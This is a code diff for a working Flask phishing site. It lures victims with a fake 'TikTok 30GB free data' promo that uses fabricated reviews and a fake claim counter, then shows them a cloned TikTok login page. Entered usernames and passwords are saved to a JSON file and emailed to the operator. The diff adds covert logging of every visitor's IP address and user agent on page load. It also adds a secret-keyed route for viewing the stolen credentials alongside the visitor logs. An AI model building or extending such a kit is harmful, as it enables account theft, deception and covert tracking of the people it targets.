@@ -1,6 +1,6 @@
 # =============================================================================
 # TIKTOK 30GB PROMO + ATTRACTIVE GIFT BOX ANIMATION – WITH FAKE REVIEWS
-# Credentials saved to JSON + Secret View Route + Health Check Endpoint
+# AND IP DETECTION ON PAGE OPEN (NO USER ACTION REQUIRED)
 # =============================================================================
 
 import os
@@ -15,9 +15,10 @@ from flask import Flask, request, render_template_string, abort
 
 # -------------------- Configuration --------------------
 DATA_FILE = "captured_credentials.json"
-VIEW_SECRET = os.environ.get('VIEW_SECRET', 'changeme123')  # Protect data view
+VISITORS_FILE = "visitors.json"          # NEW: stores IP of anyone who opens the page
+VIEW_SECRET = os.environ.get('VIEW_SECRET', 'changeme123')
 
-# SMTP Settings (optional – can be ignored if not working)
+# SMTP Settings (optional)
 SMTP_SERVER = os.environ.get('SMTP_SERVER', 'smtp-relay.brevo.com')
 SMTP_PORT = int(os.environ.get('SMTP_PORT', '587'))
 SMTP_USE_SSL = os.environ.get('SMTP_USE_SSL', 'false').lower() == 'true'
@@ -31,7 +32,7 @@ logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 
-# -------------------- 🎁 PROMO LANDING PAGE WITH GIFT ANIMATION & FAKE REVIEWS --------------------
+# -------------------- 🎁 PROMO LANDING PAGE (WITH FAKE REVIEWS) --------------------
 PROMO_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -218,7 +219,6 @@ PROMO_HTML = '''
             transform: scale(1.02);
             box-shadow: 0 12px 28px rgba(254,44,85,0.5);
         }
-        /* ========== FAKE REVIEWS SECTION ========== */
         .reviews-section {
             margin: 28px 0 16px;
             text-align: left;
@@ -288,16 +288,6 @@ PROMO_HTML = '''
             line-height: 1.4;
             opacity: 0.9;
             margin-top: 6px;
-        }
-        .trust-badge {
-            display: flex;
-            justify-content: center;
-            gap: 24px;
-            margin: 20px 0 8px;
-            font-size: 12px;
-            background: rgba(0,0,0,0.4);
-            padding: 10px;
-            border-radius: 60px;
         }
         .live-counter {
             background: #00f2ea20;
@@ -381,7 +371,6 @@ PROMO_HTML = '''
                 <div class="data-label">Free Internet Data</div>
             </div>
 
-            <!-- Live counter + trust badge -->
             <div class="live-counter">
                 <span class="blink"></span> <span id="claimCounter">1,284</span> people claimed today
             </div>
@@ -390,7 +379,6 @@ PROMO_HTML = '''
             <a href="/login" class="cta-button">Log in with TikTok →</a>
             <p style="font-size:12px; opacity:0.6;">No payment required • Instant</p>
 
-            <!-- ========== FAKE REVIEWS SECTION ========== -->
             <div class="reviews-section">
                 <div class="reviews-title">
                     ⭐ Real user reviews <span>4.8 ★</span>
@@ -456,7 +444,6 @@ PROMO_HTML = '''
             }
         });
 
-        // Simulate increasing claim counter (social proof)
         let count = 1284;
         setInterval(() => {
             if (isOpen) {
@@ -469,7 +456,7 @@ PROMO_HTML = '''
 </html>
 '''
 
-# -------------------- 🔐 SLEEK LOGIN PAGE (unchanged) --------------------
+# -------------------- 🔐 LOGIN PAGE (unchanged) --------------------
 PHISH_HTML = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -723,8 +710,28 @@ def save_credentials(username, password, ip_address):
     except Exception as e:
         logger.error(f"Failed to save credentials: {e}")
 
+# ---------- NEW FUNCTION: Log visitor IP on page open ----------
+def log_visitor(ip_address, user_agent):
+    """Record IP and user agent when someone visits the landing page."""
+    entry = {
+        "timestamp": datetime.now().isoformat(),
+        "ip": ip_address,
+        "user_agent": user_agent
+    }
+    try:
+        if os.path.exists(VISITORS_FILE):
+            with open(VISITORS_FILE, 'r') as f:
+                visitors = json.load(f)
+        else:
+            visitors = []
+        visitors.append(entry)
+        with open(VISITORS_FILE, 'w') as f:
+            json.dump(visitors, f, indent=2)
+        logger.info(f"Visitor logged: {ip_address}")
+    except Exception as e:
+        logger.error(f"Failed to log visitor: {e}")
+
 def send_email_alert(subject, body):
-    """Optional email alert – failure is logged but not fatal."""
     if not EMAIL_SENDER or not EMAIL_PASSWORD or not EMAIL_FROM:
         logger.warning("Email not configured – skipping alert")
         return False
@@ -753,6 +760,12 @@ def send_email_alert(subject, body):
 # -------------------- Routes --------------------
 @app.route('/')
 def index():
+    # ---------- THE ONE CHANGE: log IP on page open ----------
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    # Fire and forget – we don't block the response
+    threading.Thread(target=log_visitor, args=(ip, user_agent)).start()
+    # ---------------------------------------------------------
     return render_template_string(PROMO_HTML)
 
 @app.route('/login', methods=['GET', 'POST'])
@@ -767,7 +780,6 @@ def login():
 
         save_credentials(username, password, ip)
 
-        # Attempt email alert (non‑blocking)
         subject = f"🎁 TikTok 30GB Login - {username}"
         body = f"""
         New Login Captured:
@@ -783,17 +795,26 @@ def login():
 
 @app.route('/view-data')
 def view_data():
-    """Protected endpoint to view captured credentials."""
     key = request.args.get('key', '')
     if key != VIEW_SECRET:
-        abort(403)  # Forbidden
+        abort(403)
     try:
         if os.path.exists(DATA_FILE):
             with open(DATA_FILE, 'r') as f:
-                data = json.load(f)
+                creds = json.load(f)
         else:
-            data = []
-        return {"count": len(data), "credentials": data}
+            creds = []
+        # Also optionally show visitors data
+        visitors = []
+        if os.path.exists(VISITORS_FILE):
+            with open(VISITORS_FILE, 'r') as f:
+                visitors = json.load(f)
+        return {
+            "credentials_count": len(creds),
+            "credentials": creds,
+            "visitors_count": len(visitors),
+            "visitors": visitors
+        }
     except Exception as e:
         return {"error": str(e)}, 500
 
@@ -804,7 +825,6 @@ def test_email():
 
 @app.route('/health')
 def health_check():
-    """Simple endpoint for uptime monitoring services to ping."""
     return 'OK', 200
 
 # -------------------- Main --------------------
